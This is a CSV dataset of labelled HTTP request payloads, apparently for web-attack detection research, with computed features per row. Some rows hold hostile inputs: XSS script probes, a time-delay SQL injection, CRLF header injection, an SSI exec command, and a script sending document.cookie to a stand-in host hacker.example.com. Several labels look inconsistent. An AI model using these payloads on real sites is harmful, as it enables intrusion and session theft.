row_id,payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority,kb_family,char_len_computed,length_matches_computed,line_break_count,pipe_field_count_approx,space_ratio,digit_ratio,unique_char_ratio,shannon_entropy_bits,has_http_version_tail,contains_http_version_token,field_delimiter_style,quoted_csv_like_wrapping,application_injection_context,application_context_unknown_reason,percent_escape_count,percent_encoding_density,encoding_surface_class,has_double_percent_encoding,has_null_percent,has_crlf_encoded_or_literal,heuristic_pattern_band,label_consistency_flag
0,entrar | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | 84m3ri156 | on | Entrar HTTP/1.1,xss,no,92,0,1,0,1,low,xss,92,yes,0,5,0.09782608695652174,0.08695652173913043,0.42391304347826086,4.838923903753762,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,script_tag_evidence,pattern_supports_family
1,"entrar | grimshaw | G//lAc,IAr | on | Entrar HTTP/1.1",cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.03773584905660377,0.5094339622641509,4.32596267109531,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
2,entrar | grimshaw | 84m3ri156 | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium,cmd,52,yes,0,5,0.17307692307692307,0.15384615384615385,0.5,4.271521208068051,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3,2 HTTP/1.1,other,no,10,0,0,0,0,high,other,10,yes,0,1,0.1,0.3,0.8,2.9219280948873623,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,not_applicable,not_applicable
4,+ HTTP/1.1,other,no,10,0,0,0,0,high,other,10,yes,0,1,0.1,0.2,0.8,2.9219280948873623,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,not_applicable,not_applicable
5,Credenciales incorrectas HTTP/1.1,other,no,33,0,0,0,0,medium,other,33,yes,0,1,0.06060606060606061,0.06060606060606061,0.5757575757575758,4.0895524525606675,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,not_applicable,not_applicable
6,"insertar | 183','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1",sql,no,76,1,0,0,1,medium,sql,76,yes,0,3,0.11842105263157894,0.14473684210526316,0.4473684210526316,4.676323113493268,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,time_based_or_delay_primitive,pattern_supports_family
7,insertar | 183 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.12195121951219512,0.5121951219512195,4.0400882867887296,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
8,insertar | 183 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium,cmd,40,yes,0,3,0.175,0.125,0.525,4.0215277841122745,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
9,"registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | armand | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,245,0,0,0,1,low,cmd,245,yes,0,13,0.11836734693877551,0.19183673469387755,0.2,5.0407025838901145,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",10,0.04081632653061224,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
10,"registro | armand | prusiato | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,239,0,0,0,1,low,cmd,239,yes,0,13,0.12133891213389121,0.23430962343096234,0.21338912133891214,5.0899058123812635,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",4,0.016736401673640166,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
11,"registro | bau*gnon | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,195,0,0,0,1,low,cmd,195,yes,0,13,0.14871794871794872,0.16923076923076924,0.2358974358974359,4.869159118078466,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
12,"registro | armand | prusiato | Samia | Catalayud Mirabet | balademas.mareuil6@enlanzarote.com.vc | 28178710F | C/ Cala, 9,  | Mutxamel | 25332 | Zaragoza | 8608089924764976 | Registrar HTTP/1.1",cmd,no,193,0,0,0,1,low,cmd,193,yes,0,13,0.15025906735751296,0.17098445595854922,0.23316062176165803,4.82353318569646,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
13,Vaciar carrito| HTTP/1.1,cmd,no,24,0,0,0,1,high,cmd,24,yes,0,2,0.08333333333333333,0.08333333333333333,0.625,3.7720552088742005,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
14,Vaciar carrito HTTP/1.1,other,no,23,0,0,0,0,high,other,23,yes,0,1,0.08695652173913043,0.08695652173913043,0.6086956521739131,3.6753108689123635,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,not_applicable,not_applicable
15,"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Registrar HTTP/1.1",xss,no,307,1,1,0,1,low,xss,307,yes,0,13,0.10423452768729642,0.13355048859934854,0.18892508143322476,5.120238083297396,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,script_tag_evidence,pattern_supports_family
16,"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | %00 | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",cmd,no,167,0,0,0,1,low,cmd,167,yes,0,13,0.17365269461077845,0.16167664670658682,0.25149700598802394,4.649623483421361,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.005988023952095809,ascii_with_percent_encoding,False,True,False,unknown,no_keyword_pattern_matched
17,"registro | thyagara | fUeRTe | Il,i?dio | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",cmd,no,178,0,0,0,1,low,cmd,178,yes,0,13,0.16292134831460675,0.1853932584269663,0.25842696629213485,4.790697065349847,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
18,"registro | thyagara | fUeRTe | Sol | Gorgone Oteo | tissier@b-sign.cg | 03028605B | Calle Alboran 39,  | Millanes | 49731 | Tarragona | 4096797311989091 | Registrar HTTP/1.1",cmd,no,173,0,0,0,1,low,cmd,173,yes,0,13,0.1676300578034682,0.1907514450867052,0.2543352601156069,4.732626793624743,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
19,entrar | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | c69p04e13 | off | Entrar HTTP/1.1,cmd,no,109,0,0,0,1,low,cmd,109,yes,0,5,0.08256880733944955,0.1743119266055046,0.3486238532110092,4.884958183175769,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",8,0.07339449541284404,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
20,entrar | modestin | es'pec'ia/l | off | Entrar HTTP/1.1,cmd,no,55,1,0,0,1,medium,cmd,55,yes,0,5,0.16363636363636364,0.03636363636363636,0.43636363636363634,4.27601448589791,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
21,entrar | modestin | c69p04e13 | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.1509433962264151,0.5094339622641509,4.377941680570092,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
22,%3F HTTP/1.1,encoded attack,no,12,0,0,0,0,high,encoded_attack,12,yes,0,1,0.08333333333333333,0.25,0.8333333333333334,3.2516291673878226,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.08333333333333333,ascii_with_percent_encoding,False,False,False,high_percent_encoding_density,pattern_supports_family
23,1 HTTP/1.1,other,no,10,0,0,0,0,high,other,10,yes,0,1,0.1,0.3,0.7,2.6464393446710157,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,not_applicable,not_applicable
24,Credenciales incorrectasbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,encoded attack,no,97,0,0,0,0,low,encoded_attack,97,yes,0,1,0.020618556701030927,0.13402061855670103,0.3711340206185567,4.825147543674113,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",8,0.08247422680412371,ascii_with_percent_encoding,False,False,False,high_percent_encoding_density,pattern_supports_family
25,"""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,35,1,1,0,0,medium,sql,35,yes,0,1,0.08571428571428572,0.05714285714285714,0.6285714285714286,4.286146588249911,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
26,insertar | 1764any%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Pasar por caja HTTP/1.1,cmd,no,89,0,0,0,1,low,cmd,89,yes,0,3,0.07865168539325842,0.3146067415730337,0.39325842696629215,4.831480269747702,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",3,0.033707865168539325,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
27,insertar | 1764 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium,cmd,37,yes,0,3,0.13513513513513514,0.16216216216216217,0.5945945945945946,4.226628285180294,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
28,insertar | 1764 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5365853658536586,4.088868774593608,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
29,bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,encoded attack,no,73,0,0,0,0,medium,encoded_attack,73,yes,0,1,0.0136986301369863,0.1780821917808219,0.4657534246575342,4.749296949344791,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",8,0.1095890410958904,ascii_with_percent_encoding,False,False,False,high_percent_encoding_density,pattern_supports_family
30,"entrar | c/?a,ry | 0ara7s5o | on | Entrar HTTP/1.1",cmd,no,50,0,0,0,1,medium,cmd,50,yes,0,5,0.18,0.1,0.46,4.075783629896564,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
31,entrar | lucie8 | 0ara7s5o | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium,cmd,49,yes,0,5,0.1836734693877551,0.12244897959183673,0.4897959183673469,4.167896517797227,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
